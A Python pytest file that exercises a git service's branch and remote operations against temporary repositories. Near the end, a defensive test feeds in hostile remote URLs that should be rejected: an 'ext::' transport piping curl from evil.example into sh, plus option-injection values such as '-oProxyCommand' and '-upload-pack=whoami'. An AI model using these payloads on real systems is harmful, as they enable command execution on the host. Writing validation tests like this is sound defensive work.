"""Branches and remotes, against real repositories in ``tmp_path``.

Nothing here fakes git, for the reason the service tests give: every bug
this layer can have is a bug about what git actually does. Three of these
tests exist because git 2.53 did not do what the plan assumed --
``for-each-ref`` spells a literal separator ``%1f`` where ``git log`` spells
it ``%x1f``, ``%(refname:short)`` renders ``refs/remotes/origin/HEAD`` as
the bare word ``origin``, and ``git branch -u origin/main`` refuses outright
unless a remote called ``origin`` is configured -- and a fake would have
agreed with all three wrong ideas.

**No network, and no bare repository either.** Everything a remote
contributes to a BRANCH list is refs and config: ``refs/remotes/<r>/<b>``,
the ``branch.<b>.remote`` / ``.merge`` pair, and the fetch refspec that
``remote add`` writes. All three can be made by hand in a tenth of a second
(:func:`_remote_branch`, and ``git remote add`` pointed at a URL nobody
fetches), so these tests neither clone nor connect. The real bare remote
belongs to the tests for the operations that really do talk to one.

The fixtures come from ``test_git_service`` so that the two files cannot
drift apart: one ``isolated_git`` keeps the developer's own git config out
of it in both directions.
"""

from __future__ import annotations

import shutil

import pytest

from app.core.git import refs
from app.core.git.errors import GitError

# Fixtures, used by NAME rather than by reference -- what pytest wants and
# what ruff cannot see. ``Repo`` is the two-line repository helper.
from tests.test_git_service import (  # noqa: F401
    Repo,
    isolated_git,
    make_repo,
    repo,
)

pytestmark = pytest.mark.skipif(shutil.which("git") is None,
                                reason="the host has no git")

#: A remote URL nothing ever fetches from. It exists so that ``git remote
#: add`` writes the fetch refspec, which is the config ``git branch -u
#: origin/main`` insists on: without a configured remote it answers "fatal:
#: cannot set up tracking information; starting point 'origin/main' is not a
#: branch", exit 128 (measured on git 2.53).
FAR_AWAY = "file:///nowhere/mirror.git"


def _remote_branch(repo: Repo, ref: str = "origin/main",  # noqa: F811
                   sha: str | None = None) -> str:
    """Write ``refs/remotes/<ref>`` by hand; returns the sha it points at.

    A remote-tracking ref is an ordinary ref in an ordinary place, and
    ``update-ref`` is how git itself writes one at the end of a fetch. The
    caller adds the remote when it also wants the tracking CONFIG.
    """
    target = sha or repo.head()
    repo.git("update-ref", f"refs/remotes/{ref}", target)
    return target


def _error(call) -> GitError:
    """Run *call* expecting a refusal, and hand the error back for its code."""
    with pytest.raises(GitError) as excinfo:
        call()
    return excinfo.value


def _named(branches, name: str):
    """The one branch called *name*, or an assertion that says what was there."""
    found = [entry for entry in branches if entry.name == name]
    assert len(found) == 1, [entry.name for entry in branches]
    return found[0]


# --- listing branches --------------------------------------------------------


def test_a_fresh_repository_lists_the_branch_it_is_on(repo):  # noqa: F811
    answer = refs.list_branches(repo.root)

    assert answer.current == "main"
    assert answer.detached is False
    assert answer.remote == []
    main = _named(answer.local, "main")
    assert main.current is True
    assert main.sha and repo.head().startswith(main.sha)
    assert main.subject == "first"
    assert main.committed_at > 0


def test_only_the_branch_head_is_on_is_marked_current(repo):  # noqa: F811
    repo.git("branch", "feat")

    answer = refs.list_branches(repo.root)

    assert [entry.name for entry in answer.local] == ["feat", "main"]
    assert _named(answer.local, "feat").current is False
    assert _named(answer.local, "main").current is True


def test_a_branch_ahead_of_its_upstream_says_by_how_much(repo):  # noqa: F811
    behind_sha = repo.head()
    repo.commit("second", {"a.txt": "one\ntwo\nthree\n"})
    repo.git("remote", "add", "origin", FAR_AWAY)
    _remote_branch(repo, "origin/main", behind_sha)
    repo.git("branch", "-u", "origin/main", "main")

    main = _named(refs.list_branches(repo.root).local, "main")

    assert main.upstream == "origin/main"
    assert (main.ahead, main.behind) == (1, 0)
    assert main.gone is False


def test_a_branch_level_with_its_upstream_is_zero_and_not_null(repo):  # noqa: F811
    """git prints an EMPTY ``%(upstream:track)`` both for "in step" and for
    "there is no upstream", and those are different rows in the panel."""
    repo.git("remote", "add", "origin", FAR_AWAY)
    _remote_branch(repo)
    repo.git("branch", "-u", "origin/main", "main")

    main = _named(refs.list_branches(repo.root).local, "main")

    assert main.upstream == "origin/main"
    assert (main.ahead, main.behind) == (0, 0)


def test_a_branch_with_no_upstream_has_no_numbers(repo):  # noqa: F811
    repo.git("branch", "feat")

    feat = _named(refs.list_branches(repo.root).local, "feat")

    assert feat.upstream is None
    assert (feat.ahead, feat.behind, feat.gone) == (None, None, False)


def test_an_upstream_that_no_longer_exists_is_gone(repo):  # noqa: F811
    """The branch on the remote was deleted and pruned: git says ``[gone]``,
    and there is nothing to count in either direction."""
    repo.git("remote", "add", "origin", FAR_AWAY)
    repo.git("branch", "feat")
    repo.git("config", "branch.feat.remote", "origin")
    repo.git("config", "branch.feat.merge", "refs/heads/deleted")

    feat = _named(refs.list_branches(repo.root).local, "feat")

    assert feat.upstream == "origin/deleted"
    assert feat.gone is True
    assert (feat.ahead, feat.behind) == (None, None)


def test_a_remote_tracking_branch_is_split_into_remote_and_name(repo):  # noqa: F811
    _remote_branch(repo, "origin/feat/deep")

    answer = refs.list_branches(repo.root)

    assert [entry.name for entry in answer.local] == ["main"]
    assert len(answer.remote) == 1
    tracked = answer.remote[0]
    assert (tracked.remote, tracked.name) == ("origin", "feat/deep")
    assert tracked.subject == "first"


def test_the_pointer_at_a_remotes_default_branch_is_not_a_branch(repo):  # noqa: F811
    """``refs/remotes/origin/HEAD`` is the symbolic ref ``git clone`` leaves
    behind. ``%(refname:short)`` renders it as the bare word ``origin``, so
    listing it would draw a remote branch with an empty name."""
    _remote_branch(repo)
    repo.git("symbolic-ref", "refs/remotes/origin/HEAD",
             "refs/remotes/origin/main")

    answer = refs.list_branches(repo.root)

    assert [(entry.remote, entry.name) for entry in answer.remote] == [
        ("origin", "main")]


def test_a_detached_head_has_no_current_branch(repo):  # noqa: F811
    repo.git("checkout", "-q", "--detach")

    answer = refs.list_branches(repo.root)

    assert answer.current is None
    assert answer.detached is True
    # The branch is still THERE; nothing is on it.
    assert [entry.current for entry in answer.local] == [False]


def test_an_unborn_branch_still_has_a_name(make_repo):  # noqa: F811
    """A repository somebody has just initialised is on a branch that has no
    ref yet, and the header has to show its name."""
    fresh = make_repo(first_commit=False)

    answer = refs.list_branches(fresh.root)

    assert answer.current == "main"
    assert answer.detached is False
    assert answer.local == []


def test_a_separator_inside_a_subject_stays_in_the_subject(repo):  # noqa: F811
    """The subject is the LAST field for the reason the log's body is: it is
    arbitrary text, and the unit separator is not impossible in it."""
    repo.write("a.txt", "changed\n")
    repo.git("add", "-A", "--", "a.txt")
    repo.git("commit", "-q", "-m", "one\x1ftwo")

    main = _named(refs.list_branches(repo.root).local, "main")

    assert main.subject == "one\x1ftwo"


# --- listing remotes ---------------------------------------------------------


def test_a_repository_with_no_remote_lists_none(repo):  # noqa: F811
    assert refs.list_remotes(repo.root) == []


def test_a_remote_is_listed_with_both_urls(repo):  # noqa: F811
    repo.git("remote", "add", "origin", "https://example.com/owner/repo.git")

    listed = refs.list_remotes(repo.root)

    assert [entry.name for entry in listed] == ["origin"]
    assert listed[0].fetch_url == "https://example.com/owner/repo.git"
    assert listed[0].push_url == listed[0].fetch_url


def test_a_push_url_of_its_own_is_reported(repo):  # noqa: F811
    repo.git("remote", "add", "origin", "https://example.com/owner/repo.git")
    repo.git("remote", "set-url", "--push", "origin",
             "ssh://git@example.com/owner/repo.git")

    listed = refs.list_remotes(repo.root)

    assert listed[0].fetch_url == "https://example.com/owner/repo.git"
    assert listed[0].push_url == "ssh://git@example.com/owner/repo.git"


# --- creating a branch -------------------------------------------------------


async def test_create_switches_to_the_new_branch(repo):  # noqa: F811
    result = await repo.service.create_branch("feat")

    assert result.status.branch == "feat"
    assert result.detail["branch"] == "feat"
    assert refs.list_branches(repo.root).current == "feat"


async def test_create_without_checkout_leaves_you_where_you_are(repo):  # noqa: F811
    result = await repo.service.create_branch("feat", checkout=False)

    assert result.status.branch == "main"
    assert _named(refs.list_branches(repo.root).local, "feat").current is False


async def test_create_from_a_branch_starts_there(repo):  # noqa: F811
    first = repo.head()
    repo.commit("second", {"b.txt": "two\n"})
    repo.git("branch", "old", first)

    await repo.service.create_branch("feat", start_point="old")

    assert repo.head() == first


async def test_create_from_a_commit_id_starts_there(repo):  # noqa: F811
    """A start point that is a sha never reaches ``check-ref-format``: it is
    checked by shape, and whether the object exists is git's answer."""
    first = repo.head()
    repo.commit("second", {"b.txt": "two\n"})

    await repo.service.create_branch("feat", start_point=first[:10])

    assert repo.head() == first


async def test_create_with_a_name_that_exists_is_branch_exists(repo):  # noqa: F811
    repo.git("branch", "feat")

    with pytest.raises(GitError) as excinfo:
        await repo.service.create_branch("feat")

    assert excinfo.value.code == "branch_exists"
    assert excinfo.value.status == 409


@pytest.mark.parametrize("name", [
    pytest.param("-upload-pack=whoami", id="an-option"),
    pytest.param("feat branch", id="a-space"),
    pytest.param("feat..x", id="two-dots"),
    pytest.param("feat.lock", id="dot-lock"),
    pytest.param("main@{1}", id="reflog-syntax"),
])
async def test_a_name_git_will_not_take_is_refused_before_it_runs(repo, name):  # noqa: F811
    with pytest.raises(GitError) as excinfo:
        await repo.service.create_branch(name)

    assert excinfo.value.code == "invalid_ref"
    assert excinfo.value.status == 400


async def test_create_from_a_start_point_that_is_gone_is_404(repo):  # noqa: F811
    """The branch list a click comes from is up to fifteen seconds old."""
    with pytest.raises(GitError) as excinfo:
        await repo.service.create_branch("feat", start_point="deadbee")

    assert excinfo.value.code == "not_found"
    assert excinfo.value.status == 404


# --- switching ---------------------------------------------------------------


async def test_switching_says_which_files_it_replaced(repo):  # noqa: F811
    """A checkout is a worktree operation, and ``changed_paths`` is what an
    open editor reloads from."""
    repo.git("switch", "-q", "-c", "feat")
    repo.commit("on feat", {"a.txt": "feat\n"})
    repo.git("switch", "-q", "main")

    result = await repo.service.checkout("feat", kind="local")

    assert result.status.branch == "feat"
    assert "a.txt" in result.changed_paths
    assert repo.read("a.txt") == "feat\n"


async def test_switching_to_a_remote_branch_creates_a_tracking_branch(repo):  # noqa: F811
    repo.git("remote", "add", "origin", FAR_AWAY)
    _remote_branch(repo, "origin/feat")

    result = await repo.service.checkout("origin/feat", kind="remote")

    assert result.status.branch == "feat"
    assert result.detail == {"branch": "feat", "target": "origin/feat",
                             "kind": "remote"}
    assert _named(refs.list_branches(repo.root).local,
                  "feat").upstream == "origin/feat"


async def test_a_dirty_tree_blocks_a_switch(repo):  # noqa: F811
    """git compares what WOULD be overwritten against what has changed,
    which is a finer answer than "there are modifications"."""
    repo.git("switch", "-q", "-c", "feat")
    repo.commit("on feat", {"a.txt": "feat\n"})
    repo.git("switch", "-q", "main")
    repo.write("a.txt", "mine\n")

    with pytest.raises(GitError) as excinfo:
        await repo.service.checkout("feat", kind="local")

    assert excinfo.value.code == "dirty_tree"
    assert repo.read("a.txt") == "mine\n"


async def test_switching_to_a_branch_that_is_gone_is_404(repo):  # noqa: F811
    with pytest.raises(GitError) as excinfo:
        await repo.service.checkout("feat", kind="local")

    assert excinfo.value.code == "not_found"


async def test_a_remote_target_without_a_remote_half_is_400(repo):  # noqa: F811
    with pytest.raises(GitError) as excinfo:
        await repo.service.checkout("feat", kind="remote")

    assert excinfo.value.code == "invalid_ref"
    assert excinfo.value.status == 400


# --- renaming ----------------------------------------------------------------


async def test_rename_keeps_the_commits_and_the_upstream(repo):  # noqa: F811
    repo.git("remote", "add", "origin", FAR_AWAY)
    _remote_branch(repo)
    repo.git("branch", "-u", "origin/main", "main")
    head = repo.head()

    result = await repo.service.rename_branch("main", "trunk")

    assert result.status.branch == "trunk"
    assert result.detail == {"branch": "trunk", "previous": "main"}
    trunk = _named(refs.list_branches(repo.root).local, "trunk")
    assert trunk.upstream == "origin/main"
    assert repo.head() == head


async def test_renaming_onto_a_name_that_exists_is_branch_exists(repo):  # noqa: F811
    repo.git("branch", "feat")

    with pytest.raises(GitError) as excinfo:
        await repo.service.rename_branch("feat", "main")

    assert excinfo.value.code == "branch_exists"


async def test_renaming_a_branch_that_is_gone_is_404(repo):  # noqa: F811
    """git says "fatal: no branch named 'feat'", which no rule knows: the
    check is here so it is a 404 rather than a 500."""
    with pytest.raises(GitError) as excinfo:
        await repo.service.rename_branch("feat", "trunk")

    assert excinfo.value.code == "not_found"
    assert excinfo.value.status == 404


# --- deleting ----------------------------------------------------------------


async def test_deleting_the_branch_you_are_on_is_refused(repo):  # noqa: F811
    """git's own answer names the worktree's path and classifies as nothing
    at all, so this one is decided before a process starts."""
    with pytest.raises(GitError) as excinfo:
        await repo.service.delete_branch("main")

    assert excinfo.value.code == "invalid_value"
    assert excinfo.value.status == 400
    assert _named(refs.list_branches(repo.root).local, "main").current is True


async def test_deleting_a_merged_branch_needs_no_force(repo):  # noqa: F811
    repo.git("branch", "feat")

    result = await repo.service.delete_branch("feat")

    assert result.detail == {"branch": "feat", "forced": False}
    assert [entry.name for entry in refs.list_branches(repo.root).local] == [
        "main"]


async def test_deleting_an_unmerged_branch_needs_force(repo):  # noqa: F811
    repo.git("switch", "-q", "-c", "feat")
    repo.commit("only on feat", {"b.txt": "two\n"})
    repo.git("switch", "-q", "main")

    with pytest.raises(GitError) as excinfo:
        await repo.service.delete_branch("feat")

    assert excinfo.value.code == "branch_not_merged"
    assert excinfo.value.status == 409

    result = await repo.service.delete_branch("feat", force=True)

    assert result.detail == {"branch": "feat", "forced": True}
    assert [entry.name for entry in refs.list_branches(repo.root).local] == [
        "main"]


async def test_deleting_a_branch_that_is_gone_is_404(repo):  # noqa: F811
    with pytest.raises(GitError) as excinfo:
        await repo.service.delete_branch("feat")

    assert excinfo.value.code == "not_found"
    assert excinfo.value.status == 404


async def test_a_branch_name_with_a_slash_survives_every_operation(repo):  # noqa: F811
    """Half the branches anybody has are called ``feat/something``."""
    await repo.service.create_branch("feat/source-control")
    assert refs.list_branches(repo.root).current == "feat/source-control"

    await repo.service.checkout("main", kind="local")
    await repo.service.rename_branch("feat/source-control", "feat/scm")
    await repo.service.delete_branch("feat/scm", force=True)

    assert [entry.name for entry in refs.list_branches(repo.root).local] == [
        "main"]


# --- remotes -----------------------------------------------------------------


async def test_add_lists_the_new_remote(repo):  # noqa: F811
    result = await repo.service.add_remote(
        "origin", "https://example.com/owner/repo.git")

    assert result.detail == {"remote": "origin",
                             "url": "https://example.com/owner/repo.git"}
    listed = refs.list_remotes(repo.root)
    assert [entry.name for entry in listed] == ["origin"]
    assert listed[0].fetch_url == "https://example.com/owner/repo.git"


async def test_adding_a_remote_twice_is_remote_exists(repo):  # noqa: F811
    """git says "error: remote origin already exists." -- its own voice
    under an opening the classifier will not take from a hook, so the row
    for it is anchored to that whole opening."""
    await repo.service.add_remote("origin", "https://example.com/a.git")

    with pytest.raises(GitError) as excinfo:
        await repo.service.add_remote("origin", "https://example.com/b.git")

    assert excinfo.value.code == "remote_exists"
    assert excinfo.value.status == 409
    assert refs.list_remotes(repo.root)[0].fetch_url == \
        "https://example.com/a.git"


async def test_set_url_points_it_somewhere_else(repo):  # noqa: F811
    await repo.service.add_remote("origin", "https://example.com/a.git")

    await repo.service.set_remote_url("origin", "https://example.com/b.git")

    assert refs.list_remotes(repo.root)[0].fetch_url == \
        "https://example.com/b.git"


async def test_remove_forgets_it(repo):  # noqa: F811
    await repo.service.add_remote("origin", "https://example.com/a.git")

    result = await repo.service.remove_remote("origin")

    assert result.detail == {"remote": "origin"}
    assert refs.list_remotes(repo.root) == []


@pytest.mark.parametrize("call", ["set_remote_url", "remove_remote"])
async def test_touching_a_remote_that_is_not_there_is_404(repo, call):  # noqa: F811
    args = ["nope"] + (["https://example.com/a.git"]
                       if call == "set_remote_url" else [])

    with pytest.raises(GitError) as excinfo:
        await getattr(repo.service, call)(*args)

    assert excinfo.value.code == "not_found"
    assert excinfo.value.status == 404


@pytest.mark.parametrize("url", [
    pytest.param("ext::sh -c 'curl evil.example/$0|sh'", id="ext-transport"),
    pytest.param("https://-oProxyCommand=x/owner/repo.git", id="option-host"),
    pytest.param("git@github.com:-upload-pack=whoami", id="option-path"),
    pytest.param("http://example.com/a.git", id="plaintext-http"),
])
async def test_a_url_this_server_will_not_hand_to_git_is_400(repo, url):  # noqa: F811
    with pytest.raises(GitError) as excinfo:
        await repo.service.add_remote("origin", url)

    assert excinfo.value.code == "invalid_url"
    assert excinfo.value.status == 400
    assert refs.list_remotes(repo.root) == []


async def test_a_remote_name_that_is_an_option_is_refused(repo):  # noqa: F811
    with pytest.raises(GitError) as excinfo:
        await repo.service.add_remote("-f", "https://example.com/a.git")

    assert excinfo.value.code == "invalid_value"
    assert excinfo.value.status == 400
